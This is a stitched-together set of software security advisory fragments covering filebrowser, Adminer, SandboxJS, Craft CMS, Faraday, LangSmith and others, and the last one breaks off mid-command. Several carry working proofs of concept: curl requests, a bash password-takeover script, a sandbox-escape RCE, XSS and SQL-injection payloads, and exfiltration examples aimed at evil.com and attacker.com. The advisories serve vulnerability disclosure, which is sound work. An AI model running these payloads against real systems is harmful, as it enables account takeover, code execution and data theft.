latest available release.",

This resulted in `go-git` potentially consuming corrupted files, which would likely result in unexpected errors such as `object not found`.\n\nFor context, clients fetch [`packfiles`](https://git-scm.com/docs/pack-protocol#_packfile_data) from upstream Git servers. Those files contain a checksum of their contents, so that clients can perform integrity checks before consuming it. The pack indexes (`.idx`) are [generated](https://git-scm.com/docs/pack-format) locally by `go-git`, or the `git` cli, when new `.pack` files are received and processed. The integrity checks for both files were not being verified correctly.\n\nNote that the lack of verification of the packfile checksum has no impact on the trust relationship between the client and server, which is enforced based on the protocol being used (e.g. TLS in the case of `https://` or known hosts for `ssh://`). In other words, the packfile checksum verification does not provide any security benefits when connecting to a malicious or compromised Git server.\n\n### Patches\n\nUsers should upgrade to `v5.16.5`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.\n\n### Workarounds\n\nIn case updating to a fixed version of `go-git` is not possible, users can run [git fsck](https://git-scm.com/docs/git-fsck) from the `git` cli to check for data corruption on a given repository. \n\n### Credit\n\nThanks @N0zoM1z0 for finding and reporting this issue privately to the `go-git` project.",

This affects FUXA version 1.2.8 through version 1.2.10. This has been patched in FUXA version 1.2.11.\n\n### Impact\nThis affects all deployments with the Node-RED plugin enabled, including those with `runtime.settings.secureEnabled` set to true.\n\nExploitation allows an unauthenticated, remote attacker to send a specially crafted request to the `/nodered/flows` endpoint to bypass authentication checks, granting the attacker administrative access to the Node-RED deployment API. By submitting a malicious flow configuration, an attacker can execute arbitrary code in the context of the FUXA service. Depending on deployment configuration and permissions, this may lead to full system compromise and could further expose connected ICS/SCADA environments to follow-on actions.\n\n### Patches\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the latest available release.",

          "html": "### Summary\nAdminer v5.4.1 has a version check mechanism where `adminer.org` sends signed version info via JavaScript postMessage, which the browser then POSTs to `?script=version`. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST `version[]` parameter which PHP converts to an array. On next page load, `openssl_verify()` receives this array instead of string and throws `TypeError`, returning HTTP 500 to all users.\n\n### Fix\n\nUpgrade to Adminer 5.4.2.\n\n**Mitigation** (if you can't upgrade): Make file `adminer.version` in temp directory (usually the value of [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) unwritable by web server.\n\n### Details\n\n**1. Intended design of `?script=version`:**\n\nThe endpoint is designed to receive version data from `adminer.org` via browser JavaScript:\n- `functions.js` line 102-117: Creates iframe to `https://www.adminer.org/version/`\n- Adminer.org sends signed version data via `postMessage`\n- JavaScript POSTs this to `?script=version`\n- Server stores in `/tmp/adminer.version` for signature verification\n\n```javascript\n// functions.js line 117\najax(url + 'script=version', () => { }, event.data + '&token=' + token);\n```\n\n**2. The vulnerability:**\n\nThe endpoint only checks `$_GET[\"script\"] == \"version\"` - it does not validate:\n- Request origin (no CSRF token check for this endpoint)\n- Request source (any HTTP client can POST)\n- Parameter types (`version` expected as string, array not rejected)\n\n```php\n// bootstrap.inc.php line 32-40\nif ($_GET[\"script\"] == \"version\") {\n    $filename = get_temp_dir() . \"/adminer.version\";\n    @unlink($filename);\n    $fp = file_open_lock($filename);\n    if ($fp) {\n        file_write_unlock($fp, serialize(array(\"signature\" => $_POST[\"signature\"], \"version\" => $_POST[\"version\"])));\n    }\n    exit;\n}\n```\n\n**3. Type confusion crash:**\n\nWhen POST contains `version[]` instead of `version`, PHP creates an array. When Adminer reads this file and passes to `openssl_verify()`:\n\n```php\n// design.inc.php line 75\nif (openssl_verify($version[\"version\"], base64_decode($version[\"signature\"]), $public) == 1) {\n```\n\nPHP 8.x throws:\n```\nTypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given\n```\n\n### PoC\n\n**Steps to Reproduce:**\n\n**Step 1:** Verify Adminer is running and accessible.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n200\n```\n\n**Step 2:** Send the malicious POST request. The `version[]` syntax causes PHP to create an array instead of a string.\n```bash\ncurl -X POST \"http://localhost:8888/adminer-5.4.1.php?script=version\" \\\n     -d \"signature=x&version[]=INJECTED\"\n```\nExpected output: Empty response (no error).\n\n**Step 3:** Access Adminer again to trigger the crash.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n500\n```\n\n**Step 4:** (Optional) View the PHP error in server logs.\n```\nPHP Fatal error:  Uncaught TypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given in adminer-5.4.1.php:1386\n```\n\n**Step 5:** (Optional) Inspect the poisoned file.\n```bash\ncat /tmp/adminer.version\n```\nExpected output:\n```\na:2:{s:9:\"signature\";s:1:\"x\";s:7:\"version\";a:1:{i:0;s:8:\"INJECTED\";}}\n```\n\n**Recovery:**\n```bash\nrm /tmp/adminer.version\n```\nAfter deletion, Adminer returns HTTP 200.\n\n---\n\n### Impact\n\n**Type:** Denial of Service\n\n**Root cause:** The `?script=version` endpoint is designed to receive data from `adminer.org` via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before `openssl_verify()`, this allows persistent DoS.\n\n**Affected users:** Any Adminer instance accessible over the network.",

By adding multiple slashes (e.g., //private/) to the path, the authorization check fails to match the rule, while the underlying filesystem resolves the path correctly, granting unauthorized access to restricted files.\n\n### Details\nThe vulnerability allows users to bypass \"Disallow\" rules defined by administrators.\n\nThe issue stems from how the application handles URL path normalization and rule matching:\n\n1. Router Configuration: The router in `http/http.go` is configured with `r.SkipClean(true)`. This prevents the automatic collapse of multiple slashes (e.g., // becoming /) before the request reaches the handler.\n2. Insecure Rule Matching: The rule enforcement logic in `rules/rules.go` relies on a simple string prefix match: `strings.HasPrefix(path, r.Path)`. If a rule disallows /private, a request for //private fails this check because //private does not strictly start with /private.\n3. Filesystem Resolution: After bypassing the rule check, the non-normalized path is passed to the filesystem. The filesystem treats the multiple slashes as a single separator, successfully resolving //private/secret.txt and serving the file.\n\n### PoC\n[Python minimal PoC](https://github.com/user-attachments/files/24823114/poc.py)\n\nThe following steps demonstrate the vulnerability:\n1. Setup:\n  - Admin user creates a folder /private and adds a file /private/secret.txt.\n<img width=\"971\" height=\"719\" alt=\"Screenshot_20260123_151608\" src=\"https://github.com/user-attachments/assets/2071c92e-2bbe-46f8-a338-05b0f53d381a\" />\n<img width=\"890\" height=\"386\" alt=\"Screenshot_20260123_151551\" src=\"https://github.com/user-attachments/assets/1def540a-de26-4666-a6ab-058d5927bfbe\" />\n  - Admin adds a Disallow rule for user bob on the path /private.\n<img width=\"1005\" height=\"1126\" alt=\"Screenshot_20260123_151502\" src=\"https://github.com/user-attachments/assets/e9b57d59-f4ab-41d8-b056-8ffdaa219963\" />\n\n2. Verification:\n  - User bob requests GET /api/resources/private/secret.txt.\n  - Server responds: 403 Forbidden.\n<img width=\"1193\" height=\"721\" alt=\"Screenshot_20260123_154446\" src=\"https://github.com/user-attachments/assets/dd092a10-2f8c-4a3c-b48f-d540c483bb5a\" />\n3. Exploit:\n  - User bob requests GET /api/resources//private/secret.txt.\n  - Server responds: 200 OK (Bypass successful).\n<img width=\"1193\" height=\"721\" alt=\"Screenshot_20260123_154544\" src=\"https://github.com/user-attachments/assets/27ebb82c-f7c2-467d-ae82-f495ae3aa2d4\" />\n<img width=\"1196\" height=\"818\" alt=\"Screenshot_20260123_154618\" src=\"https://github.com/user-attachments/assets/82035884-9a24-490d-b928-7bdd2dbe3193\" />\n\n\n### Impact\nThis vulnerability impacts the confidentiality and integrity of data stored in filebrowser.\n- Confidentiality: Users can read files they are explicitly forbidden from accessing.\n- Integrity: If the user has general write permissions but is restricted from specific directories via rules, they can bypass these restrictions to rename, delete, or modify files.",

When a global prototype reference (e.g., `Map.prototype`, `Set.prototype`) is placed into an array and retrieved, the `isGlobal` taint is stripped, permitting direct prototype mutation from within the sandbox. This results in persistent host-side prototype pollution and may enable RCE in applications that use polluted properties in sensitive sinks (example gadget: `execSync(obj.cmd)`).\n\n### Details\n#### Root Cause:\nThe sandbox implements a protection mechanism using the `isGlobal` flag in the Prop class to prevent modification of global objects and their prototypes. However, this taint tracking is lost when values pass through array/object literal creation.\n\n#### Vulnerable Code Path `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):\n```ts\naddOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {\n  const items = (b as LispItem[])\n    .map((item) => {\n      if (item instanceof SpreadArray) {\n        return [...item.item];\n      } else {\n        return item;\n      }\n    })\n    .flat()\n    .map((item) => valueOrProp(item, context));  // <- isGlobal flag lost here\n  done(undefined, items);\n});\n```\n#### Exploitation Flow:\n```txt\nSandboxed code: const m=[Map.prototype][0]\n              ↓\nArray creation: isGlobal taint stripped via valueOrProp()\n              ↓\nPrototype mutation: m.cmd='id' (host prototype polluted)\n              ↓\nHost-side impact: new Map().cmd === 'id' (persistent)\n              ↓\nRCE (application-dependent): host code calls execSync(obj.cmd)\n```\n\n#### Protection Bypass Location `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):\n```ts\nset(key: string, val: unknown) {\n  // ...\n  if (prop.isGlobal) {  // <- This check is bypassed\n    throw new SandboxError(`Cannot override global variable '${key}'`);\n  }\n  (prop.context as any)[prop.prop] = val;\n  return prop;\n}\n```\nWhen the prototype is accessed via array retrieval, the `isGlobal` flag is no longer set, so this protection is never triggered.\n\n### PoC\n#### Prototype pollution via array intermediary:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const arr=[Map.prototype];\n  const p=arr[0];\n  p.polluted='pwned';\n  return 'done';\n`)().run();\n\nconsole.log('polluted' in ({}), new Map().polluted);\n```\n**Observed output**: `false pwned`\n\n#### Overwrite `Set.prototype.has`:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const s=[Set.prototype][0];\n  s.has=isFinite;\n  return 'done';\n`)().run();\n\nconsole.log('has overwritten:', Set.prototype.has === isFinite);\n```\n\n**Observed output**: `has overwritten: true`\n\n#### RCE via host gadget (prototype pollution -> execSync):\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst { execSync } = require('child_process');\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const m=[Map.prototype][0];\n  m.cmd='id';\n  return 'done';\n`)().run();\n\nconst obj = new Map();\nconst out = execSync(obj.cmd, { encoding: 'utf8' }).trim();\nconsole.log(out);\n```\n\n**Observed output**: `uid=501(user) gid=20(staff) groups=20(staff),...`\n\n### Impact\nThis is a sandbox escape: untrusted sandboxed code can persistently mutate host built-in prototypes (e.g., `Map.prototype`, `Set.prototype`), breaking isolation and impacting subsequent host execution. RCE is possible in applications that later use attacker-controlled (polluted) properties in sensitive sinks (e.g., passing `obj.cmd` to `child_process.execSync`).\n\n**Affected Systems**: any application using `@nyariv/sandboxjs` to execute untrusted JavaScript.\n\n### Remediation\n- Preserve `isGlobal` protection across array/object literal creation (do not unwrap `Prop` into raw values in a way that drops the global/prototype taint).\n- Add a hard block on writes to built-in prototypes (e.g., `Map.prototype`, `Set.prototype`, etc.) even if they are obtained indirectly through literals.\n- Defense-in-depth: freeze built-in prototypes in the host process before running untrusted code (may be breaking for some consumers).",

          "html": "# Security Advisory: Authentication Bypass in User Password Update\n\n## Summary\n\nA case-sensitivity flaw in the password validation logic allows any authenticated user to change their password (or an admin to change any user's password) **without providing the current password**. By using Title Case field name `\"Password\"` instead of lowercase `\"password\"` in the API request, the `current_password` verification is completely bypassed. This enables account takeover if an attacker obtains a valid JWT token through XSS, session hijacking, or other means.\n\n**CVSS Score**: 7.5 (High)  \n**CWE**: CWE-178 (Improper Handling of Case Sensitivity)\n\n---\n\n## Details\n\nThe vulnerability exists in `http/users.go` in the `userPutHandler` function (lines 181-200).\n\n### Vulnerable Code\n\n```go\n// http/users.go:181-200\nif d.settings.AuthMethod == auth.MethodJSONAuth {\n    var sensibleFields = map[string]struct{}{\n        \"all\":          {},\n        \"username\":     {},\n        \"password\":     {},  // lowercase\n        \"scope\":        {},\n        \"lockPassword\": {},\n        \"commands\":     {},\n        \"perm\":         {},\n    }\n\n    for _, field := range req.Which {\n        if _, ok := sensibleFields[field]; ok {  // Case-sensitive lookup\n            if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n                return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n            }\n            break\n        }\n    }\n}\n```\n\n### Root Cause\n\n1. The `sensibleFields` map uses **lowercase** keys (e.g., `\"password\"`)\n2. The lookup `sensibleFields[field]` is **case-sensitive**\n3. When `req.Which` contains `\"Password\"` (Title Case), the lookup returns `false`\n4. The password verification block is skipped entirely\n5. Later in the code (line 229), field names are converted to Title Case for processing, so `\"Password\"` is a valid field name\n\n### Attack Flow\n\n```\n1. Attacker obtains victim's JWT token (via XSS, log leakage, etc.)\n2. Attacker sends PUT /api/users/{id} with:\n   - which: [\"Password\"]  (Title Case - bypasses validation)\n   - data.password: \"attacker_password\"\n   - NO current_password field required\n3. Password is changed without verification\n4. Victim is locked out, attacker has full access\n```\n\n---\n\n## PoC\n\n### Prerequisites\n- A valid JWT token for any user account\n- Target Filebrowser instance using JSON authentication (default)\n\n### Reproduction Steps\n\n**Step 1: Obtain a valid JWT token**\n```bash\nTOKEN=$(curl -s -X POST \"http://target:8080/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"victim\",\"password\":\"victim_password\"}')\n```\n\n**Step 2: Attempt normal password change (should fail)**\n```bash\ncurl -s -X PUT \"http://target:8080/api/users/1\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"what\": \"user\",\n    \"which\": [\"password\"],\n    \"data\": {\"id\": 1, \"password\": \"NewPassword123456\"}\n  }'\n# Response: 400 Bad Request (the current password is incorrect)\n```\n\n**Step 3: Bypass with Title Case (succeeds without current_password)**\n```bash\ncurl -s -X PUT \"http://target:8080/api/users/1\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"what\": \"user\",\n    \"which\": [\"Password\"],\n    \"data\": {\"id\": 1, \"password\": \"HackedPassword123\"}\n  }'\n# Response: 200 OK\n```\n\n**Step 4: Verify account takeover**\n```bash\n# Original password no longer works\ncurl -s -X POST \"http://target:8080/api/login\" \\\n  -d '{\"username\":\"victim\",\"password\":\"victim_password\"}'\n# Response: 403 Forbidden\n\n# New password works\ncurl -s -X POST \"http://target:8080/api/login\" \\\n  -d '{\"username\":\"victim\",\"password\":\"HackedPassword123\"}'\n# Response: Valid JWT token\n```\n\n### Automated PoC Script\n\n```bash\n#!/bin/bash\n# Usage: ./poc.sh <target> <username> <current_password> <new_password>\n\nTARGET=\"$1\"\nUSERNAME=\"$2\"\nCURRENT_PASS=\"$3\"\nNEW_PASS=\"$4\"\n\n# Login\nTOKEN=$(curl -s -X POST \"$TARGET/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"username\\\":\\\"$USERNAME\\\",\\\"password\\\":\\\"$CURRENT_PASS\\\"}\")\n\n# Get user ID from token\nUSER_ID=$(echo \"$TOKEN\" | python3 -c \"\nimport sys,json,base64\nparts=input().split('.')\npayload=json.loads(base64.b64decode(parts[1]+'=='))\nprint(payload['user']['id'])\n\")\n\n# Exploit: Change password without current_password\ncurl -s -X PUT \"$TARGET/api/users/$USER_ID\" \\\n  -H \"X-Auth: $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\n    \\\"what\\\": \\\"user\\\",\n    \\\"which\\\": [\\\"Password\\\"],\n    \\\"data\\\": {\\\"id\\\": $USER_ID, \\\"password\\\": \\\"$NEW_PASS\\\"}\n  }\"\n\necho \"Password changed to: $NEW_PASS\"\n```\n\n---\n\n## Impact\n\n### Who is Impacted\n\n- **All Filebrowser users** using JSON authentication method (default configuration)\n- Any user whose JWT token can be obtained by an attacker\n- Particularly high-value targets: administrator accounts\n\n### Attack Scenarios\n\n| Scenario | Impact |\n|----------|--------|\n| XSS + Token Theft | Complete account takeover |\n| JWT in Server Logs | Mass account compromise |\n| Shared Computer | Session hijacking |\n| Malicious Browser Extension | Credential theft |\n\n### Security Impact\n\n| Category | Severity |\n|----------|----------|\n| Confidentiality | **High** - Attacker gains full account access |\n| Integrity | **High** - Attacker can modify all user data |\n| Availability | **High** - Legitimate user locked out |\n\n### Scope\n\n- The vulnerability affects **password modification only**\n- Other sensitive fields (`Username`, `Scope`, `Perm`, etc.) have additional protection via `NonModifiableFieldsForNonAdmin` check\n- However, for **administrators**, all fields can be modified using this bypass technique\n\n---\n\n## Suggested Fix\n\n### Option 1: Case-insensitive field matching (Recommended)\n\n```go\n// Convert field to lowercase before checking\nfor _, field := range req.Which {\n    if _, ok := sensibleFields[strings.ToLower(field)]; ok {\n        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n        }\n        break\n    }\n}\n```\n\n### Option 2: Use Title Case in sensibleFields\n\n```go\nvar sensibleFields = map[string]struct{}{\n    \"All\":          {},\n    \"Username\":     {},\n    \"Password\":     {},  // Title Case to match post-transformation\n    \"Scope\":        {},\n    \"LockPassword\": {},\n    \"Commands\":     {},\n    \"Perm\":         {},\n}\n\n// Check AFTER field name transformation\nfor k, v := range req.Which {\n    v = cases.Title(language.English, cases.NoLower).String(v)\n    req.Which[k] = v\n    \n    // Now check with Title Case\n    if _, ok := sensibleFields[v]; ok {\n        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {\n            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect\n        }\n        break\n    }\n}\n```\n\n---\n\n## References\n\n- Affected File: `http/users.go`\n- Affected Lines: 181-200\n- Related Code: `NonModifiableFieldsForNonAdmin` (line 17)",

The route was configured with auth_required=false and performed no session validation, exposing the Adminer UI to unauthenticated users.\n\nNote: Database access itself requires credentials that are only set through the ACL-protected API endpoint. Direct database access without prior admin login is not possible through this vulnerability alone.\n\n### Impact\nAn unauthenticated user could access the Adminer interface, potentially disclosing version information or exploiting Adminer-specific vulnerabilities.\n\n### Patches\nVersion 2.2.1 adds session validation. The Adminer route now verifies an authenticated session flag before rendering — returning HTTP 403 otherwise.\n\n### Workarounds\nDeactivate or uninstall the plugin.",

These values are then passed to `send`, which is used to call an arbitrary class method. However, there is no validation that the provided `command` value is one of the expected RPC methods. \nThis means that an attacker could supply a `command` value such as `system`, and then pass arbitrary system commands into the `args` parameter and achieve remote code execution. \n\n### PoC\n1. Start the RPC server\n2. Send a request to the RPC server as so:\n ```\ncurl -X POST http://127.0.0.1:18443 -H 'Content-Type: application/json' \\\n    -d '{\"method\":\"eval\",\"params\":[\"File.write(\\\"/tmp/pwned\\\",\\\"owned\\\")\"]}'\n```\n3. Check the /tmp folder on the machine where the RPC server is being run. If a folder /pwned now exists, the vulnerability is confirmed.\n### Impact\nThis vulnerability would impact anyone running the RPC server. The impact is higher for those who are running it publicly exposed to the internet.\n\n### Remediation                                                \n                                                                                                                                                                                                                               \n  **Mitigating Factors:**                                                                                                                                                                                                      \n  - The RPC server is part of the experimental SPV node feature, which is not documented and has very few users.                                                                                                               \n  - The SPV-related features may be removed in future releases.                                                                                                                                                                \n                                                                                                                                                                                                                               \n  **Resolution:**                                                                                                                                                                                                              \n  - Added whitelist validation to allow only RPC methods defined in `RequestHandler`.                                                                                                                                          \n  - Fixed in version 1.12.0.",

          "html": "### Impact\n\n  Faraday's `build_exclusive_url` method (in `lib/faraday/connection.rb`) uses Ruby's\n  `URI#merge` to combine the connection's base URL with a user-supplied path. Per RFC 3986,\n  protocol-relative URLs (e.g. `//evil.com/path`) are treated as network-path references\n  that override the base URL's host/authority component.\n\n  This means that if any application passes user-controlled input to Faraday's `get()`,\n  `post()`, `build_url()`, or other request methods, an attacker can supply a\n  protocol-relative URL like `//attacker.com/endpoint` to redirect the request to an\n  arbitrary host, enabling Server-Side Request Forgery (SSRF).\n\n  The `./` prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with\n  `/`, so protocol-relative URLs bypass it entirely.\n\n  **Example:**\n  ```ruby\n  conn = Faraday.new(url: 'https://api.internal.com')\n  conn.get('//evil.com/steal')\n  # Request is sent to https://evil.com/steal instead of api.internal.com\n  ```\n\n### Patches\n\n  Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.\n\n### Workarounds\n\n  **NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.**\n\n  Applications should validate and sanitize any user-controlled input before passing it to\n  Faraday request methods. Specifically:\n\n  - Reject or strip input that starts with // followed by a non-/ character\n  - Use an allowlist of permitted path prefixes\n  - Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday\n\n  Example validation:\n  ```ruby\n  def safe_path(user_input)\n    raise ArgumentError, \"Invalid path\" if user_input.match?(%r{\\A//[^/]})\n    user_input\n  end\n  ```",

An attacker can inject arbitrary `api_url` values through the `baggage` header, causing the SDK to exfiltrate sensitive trace data to attacker-controlled endpoints.\n\n---\n\n## Description\n\nWhen using distributed tracing, the SDK parses incoming HTTP headers via `RunTree.from_headers()` in Python or `RunTree.fromHeaders()` in Typescript. The `baggage` header can contain replica configurations including `api_url` and `api_key` fields.\n\nPrior to the fix, these attacker-controlled values were accepted without validation. When a traced operation completes, the SDK's `post()` and `patch()` methods send run data to all configured replica URLs, including any injected by an attacker.\n\n---\n\n## Attack Vector\n\n1. Attacker sends an HTTP request to a vulnerable service with a malicious `baggage` header:\n   ```\n   baggage: langsmith-replicas=[{\"api_url\":\"https://attacker.com/exfil\",\"project_name\":\"x\"}]\n   ```\n\n2. The service parses the header via `RunTree.from_headers()`, storing the attacker's URL\n\n3. When the traced operation completes, the SDK sends the full run data (including LLM inputs, outputs, and metadata) to `https://attacker.com/exfil`\n\n---\n\n## Impact\n\n- **Data Exfiltration:** Sensitive trace data including LLM prompts, completions, and application metadata sent to attacker-controlled servers\n- **SSRF:** Ability to make the server send requests to arbitrary URLs, potentially targeting internal services\n\n---\n\n## Affected Use Cases\n\nApplications are vulnerable if they:\n- Use `TracingMiddleware` to automatically propagate tracing context\n- Call `RunTree.from_headers()` / `RunTree.fromHeaders()` with untrusted HTTP headers\n\n---\n\n## Remediation\n\nUpdate to the patched versions:\n- **Python:** `pip install langsmith>=0.6.3`\n- **JavaScript:** `npm install langsmith@>=0.4.6`\n\nThe fix filters incoming replica configurations to an allowlist of safe fields, removing `api_url`, `api_key`, and other credential fields.\n\n---\n\n## Workarounds\n\nIf unable to upgrade immediately:\n- Strip or validate the `baggage` header before passing to `from_headers()`\n- Do not use `TracingMiddleware` with untrusted traffic",

          "html": "## Relationship to Previously Patched Vulnerability\n\nThis vulnerability is **in addition to** the RCE vulnerability patched in [GHSA-255j-qw47-wjh5](https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5). That advisory addressed a similar RCE vulnerability that affected two specific routes:\n\n- `/index.php?p=admin%2Factions%2Ffields%2Fapply-layout-element-settings`\n- `/index.php?p=admin%2Factions%2Ffields%2Frender-card-preview`\n\nThis one addresses some additional endpoints that were not covered in the https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5.\n\nThe patched vulnerability used a malicious `AttributeTypecastBehavior` with a wildcard event listener (`\"on *\": \"self::beforeSave\"`) and `__construct()` syntax to trigger RCE via the `typecastBeforeSave` callback. The fix was implemented in commits:\n- [6e608a1](https://github.com/craftcms/cms/commit/6e608a1a5bfb36943f94f584b7548ca542a86fef)\n- [27f5588](https://github.com/craftcms/cms/commit/27f55886098b56c00ddc53b69239c9c9192252c7)\n- [ec43c49](https://github.com/craftcms/cms/commit/ec43c497edde0b2bf2e39a119cded2e55f9fe593)\n\nThis vulnerability follows the same attack pattern (behavior injection via `\"as <behavior>\"` syntax) but affects a **different code path** (`assembleLayoutFromPost()` in `Fields.php`) that was **not patched** in those commits. The attack vector uses `typecastAfterValidate` instead of `typecastBeforeSave` and does not require the wildcard event listener syntax, demonstrating that multiple entry points exist for this type of vulnerability.\n\n---\n\n## Executive Summary\n\nA Remote Code Execution (RCE) vulnerability exists in Craft CMS where the `assembleLayoutFromPost()` function in `src/services/Fields.php` fails to sanitize user-supplied configuration data before passing it to `Craft::createObject()`. This allows authenticated administrators to inject malicious Yii2 behavior configurations that execute arbitrary system commands on the server. This vulnerability represents an **unpatched variant** of the behavior injection vulnerability addressed in GHSA-255j-qw47-wjh5, affecting different endpoints through a separate code path.\n\n---\n\n## Vulnerability Details\n\n### Attack Prerequisites\n\n- **Authentication:** Admin-level access required\n- **Network Access:** Access to admin panel (`/admin`)\n\n---\n\n\n### Location\n\n- **File:** `src/services/Fields.php`\n- **Function:** `assembleLayoutFromPost()` (lines 1125-1143)\n- **Root Cause:** Missing `cleanseConfig()` call on user-supplied `fieldLayout` POST parameter\n\n### Vulnerable Code Path\n\n```php\n// src/services/Fields.php:1125-1133\npublic function assembleLayoutFromPost(?string $namespace = null): FieldLayout\n{\n    $paramPrefix = $namespace ? rtrim($namespace, '.') . '.' : '';\n    $request = Craft::$app->getRequest();\n    $config = JsonHelper::decode($request->getBodyParam(\"{$paramPrefix}fieldLayout\"));\n    // ... additional config values added ...\n    $layout = $this->createLayout($config);  // <-- No cleanseConfig() call!\n    // ...\n}\n\n// src/services/Fields.php:1089-1093\npublic function createLayout(array $config): FieldLayout\n{\n    $config['class'] = FieldLayout::class;\n    return Craft::createObject($config);  // <-- Untrusted data passed directly\n}\n```\n---\n\n## Attack Chain\n\nThe exploitation leverages Yii2's object configuration system and behavior attachment mechanism:\n\n1. **Behavior Injection:** Attacker includes `'as rce'` key in the `fieldLayout` JSON POST parameter\n2. **Object Creation:** `Craft::createObject()` processes the config through Yii2's `BaseYii::configure()`\n3. **Behavior Attachment:** Yii2's `Component::__set()` detects the `'as '` prefix and attaches the behavior\n4. **RCE Trigger:** When `validate()` is called on the model, `EVENT_AFTER_VALIDATE` fires\n5. **Command Execution:** `AttributeTypecastBehavior` calls the configured typecast function (`ConsoleProcessus::execute`) with the `uid` attribute value as the command\n\n### RCE Gadget Chain\n\n```\nFieldLayout POST parameter\n    → Craft::createObject()\n    → Yii2 Component::__set() with 'as rce' key\n    → AttributeTypecastBehavior attached\n    → Model::validate() called\n    → EVENT_AFTER_VALIDATE triggered\n    → typecastAfterValidate → typecastAttributes()\n    → call_user_func(['Psy\\Readline\\Hoa\\ConsoleProcessus', 'execute'], $command)\n    → Shell command execution\n```\n\n---\n\n## Affected Controllers\n\nThe `assembleLayoutFromPost()` function is called by multiple admin controllers:\n\n| Controller | Action | Permission Required |\n|------------|--------|---------------------|\n| `TagsController` | `actionSaveTagGroup()` | Admin |\n| `CategoriesController` | `actionSaveGroup()` | Admin |\n| `EntryTypesController` | `actionSave()` | Admin |\n| `GlobalsController` | `actionSaveSet()` | Admin |\n| `VolumesController` | `actionSave()` | Admin |\n| `UsersController` | `actionSaveUserFieldLayout()` | Admin |\n| `AddressesController` | `actionSaveAddressFieldLayout()` | Admin |\n\n---\n## References\n\n- https://github.com/craftcms/cms/commit/395c64f0b80b507be1c862a2ec942eaacb353748\n- [GHSA-255j-qw47-wjh5](https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5) - Previously patched RCE vulnerability via behavior injection (affecting different endpoints)\n- [CVE-2024-4990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4990) - Related vulnerability that inspired the behavior injection attack pattern\n- [Yii2 GHSA-gcmh-9pjj-7fp4](https://github.com/yiisoft/yii2/security/advisories/GHSA-gcmh-9pjj-7fp4) - Original Yii framework report (framework team declined to fix at framework level)\n\n---",

Log in with an admin account\n2. Navigate to **Settings** → **Fields** → **New field**\n3. Choose **Number** as the field type\n4. Set the **Prefix/Suffix Text** field to: <img width=\"611\" height=\"908\" alt=\"image\" src=\"https://github.com/user-attachments/assets/63766ca4-4fa9-490b-8bea-37364137527d\" />\n```html\n<img src=x onerror=\"alert('Number Prefix/Suffix XSS')\" hidden>\n```\n5. Save the field\n6. Add this field to any element (e.g., User Profile fields via **Settings** → **Users** → **User Fields**)\n7. Navigate to your account (`/admin/myaccount`) or any user profile (`/admin/users/{id}`)\n8.

Log in to the control panel\n2. Navigate to any element index (e.g., **Users** `/admin/users`, **Entries**, **Assets**, etc.)\n3. Intercept the `POST` request to `/index.php?p=admin/actions/element-indexes/get-elements`\n4. Modify the JSON body to the following:\n```json\n{\"context\":\"index\",\"elementType\":\"craft\\\\elements\\\\User\",\"source\":\"*\",\"baseCriteria\":{\"siteId\":1},\"criteria\":{\"limit\":100,\"orderBy\": \"(elements.id) DESC, (SELECT SLEEP(5)) --\"},\"viewState\":{\"static\":false}}\n```\n5. Send the request\n6. Observe a delay in the response (delay = rows × sleep time)\n\nAlternatively, you can use the following `curl` (bash syntax) command (replace cookie, CSRF token, and target domain as needed):\n```bash\ncurl --path-as-is -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-CSRF-Token: <CSRF-TOKEN>' -H $'Content-Length: 208' -b $'<Cookie>' --data-binary 